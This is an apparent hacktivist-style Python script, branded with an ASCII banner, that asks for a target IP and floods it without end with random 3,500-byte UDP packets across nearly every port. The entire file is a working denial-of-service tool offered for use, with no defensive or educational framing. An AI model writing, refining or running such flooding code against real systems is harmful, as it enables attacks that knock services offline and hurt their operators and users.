import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print(" ")
print("\033[32m  © © © ©   ®  ©   © ©   ©       ©       ©       © © © ©      \033[0m")                                                
print("\033[32m       ©    ©  © ©    ©  ©       ©     ©   ©     ©      ©     \033[0m")                    
print("\033[31m      ©     ©  ©      ©  ©   ©   ©    ©     ©    ©     ©      \033[0m")            
print("\033[31m    ©       ©  ©      ©  ©   ©   ©   © © © © ©   © © ©        \033[0m")
print("\033[31m   © © © ©  ©  ©      ©    ©   ©    ©         ©  ©    ©       \033[0m")    
print("\033[31m                                                              \033[0m")
print("\033[31m                                                              \033[0m")
print("\033[32m[[=====================================( BY: ZANAHMAD )========]] \033[0m")
print("\033[31m[[  B R I G A D E   A T T A C K E R   S N I P E R   E L I T E  ]] \033[0m")
print("\033[33m[[                                                             ]] \033[0m")
print("\033[31m[[                 ° INTERNAL SCRIPT °                         ]] \033[0m")
print("\033[32m[[=============================================================]] \033[0m")
print("\033[32m_______________________________________\033[0m")
ip = input("[+] Target's IP : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[32mSend \033[33m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[33mAttack finished\033[0m")
